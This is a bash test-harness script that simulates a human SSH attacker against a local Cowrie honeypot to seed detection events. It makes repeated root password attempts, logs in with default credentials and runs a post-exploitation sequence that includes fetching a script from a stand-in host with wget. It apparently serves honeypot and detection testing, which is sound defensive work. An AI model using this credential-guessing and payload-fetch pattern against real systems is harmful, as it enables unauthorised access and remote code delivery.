#!/usr/bin/env bash
#
# seed_attacker.sh — CHIMERA P08 (verifier / test harness, NOT production)
#
# Simulates a HUMAN SSH attacker against the Cowrie honeypot:
#   1. 3 failed logins with bad creds (root/root — Cowrie default denies it)
#   2. a successful login with root/toor (Cowrie default accepts it)
#   3. a short post-exploitation command sequence inside the Cowrie shell
#      (whoami; uname -a; wget http://example.com/x.sh), with human-like pacing.
#
# The src_ip Cowrie records for a host-originated SSH connection is the docker
# bridge gateway 172.30.0.1 — that is the identity the orchestrator keys on.
#
# Robustness: every ssh/sshpass invocation is wrapped in `timeout` so a hung
# honeypot can never stall the smoke test. Failed-login attempts are EXPECTED to
# return non-zero (auth denied) and do not abort the script.
#
# Usage:  bash scripts/seed_attacker.sh
# Deps:   sshpass (auto-installed via apt if missing; passwordless sudo assumed).
set -uo pipefail

# ----- config -----------------------------------------------------------------
TARGET_HOST="127.0.0.1"
TARGET_PORT="2222"
GOOD_USER="root"
GOOD_PASS="toor"   # Cowrie default userdb: accepts root/toor
BAD_USER="root"
BAD_PASS="root"    # Cowrie default userdb: denies root/root
SSH_TIMEOUT="20"   # per-invocation wall-clock cap (seconds)
# Pace between actions to look human. Override with FAST=1 for a quick run.
PACE="${PACE:-2}"
[ "${FAST:-0}" = "1" ] && PACE="0"

SSH_OPTS=(
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o PreferredAuthentications=password
  -o PubkeyAuthentication=no
  -o ConnectTimeout=10
  -o LogLevel=ERROR
  -p "${TARGET_PORT}"
)

log() { printf '[seed_attacker] %s\n' "$*"; }

ensure_sshpass() {
  if command -v sshpass >/dev/null 2>&1; then
    return 0
  fi
  log "sshpass missing; installing via apt..."
  sudo apt-get update -y >/dev/null 2>&1 || true
  sudo apt-get install -y sshpass >/dev/null 2>&1 || {
    log "ERROR: could not install sshpass"
    return 1
  }
}

# Run one ssh session with the given password + remote command string.
# Returns ssh's exit code; never aborts the script (caller decides).
ssh_run() {
  local pass="$1"; shift
  local user="$1"; shift
  local remote_cmd="$1"; shift
  timeout "${SSH_TIMEOUT}" sshpass -p "${pass}" \
    ssh "${SSH_OPTS[@]}" "${user}@${TARGET_HOST}" "${remote_cmd}" 2>&1
  return $?
}

main() {
  ensure_sshpass || exit 1

  log "target=${TARGET_HOST}:${TARGET_PORT} (Cowrie). Beginning human-paced attack."

  # ---- phase 1: failed logins (bad creds) ----
  local i
  for i in 1 2 3; do
    log "failed-login attempt ${i}/3 (${BAD_USER}/${BAD_PASS})"
    ssh_run "${BAD_PASS}" "${BAD_USER}" "whoami" >/dev/null 2>&1 || true
    sleep "${PACE}"
  done

  # ---- phase 2: successful login + post-exploitation commands ----
  log "successful login (${GOOD_USER}/${GOOD_PASS}) + post-exploitation commands"
  # Slow, human-like pacing between commands via shell `sleep`s inside the session.
  local remote_cmd
  remote_cmd="whoami; sleep ${PACE}; uname -a; sleep ${PACE}; wget http://example.com/x.sh; sleep 1; id; exit"
  local out
  out="$(ssh_run "${GOOD_PASS}" "${GOOD_USER}" "${remote_cmd}")"
  local rc=$?
  printf '%s\n' "${out}" | sed 's/^/[cowrie] /'

  if [ "${rc}" -ne 0 ]; then
    log "WARNING: interactive session returned rc=${rc} (events may still have been recorded)"
  fi

  log "done. (Cowrie records src_ip=172.30.0.1 for these host-originated sessions.)"
  return 0
}

main "$@"
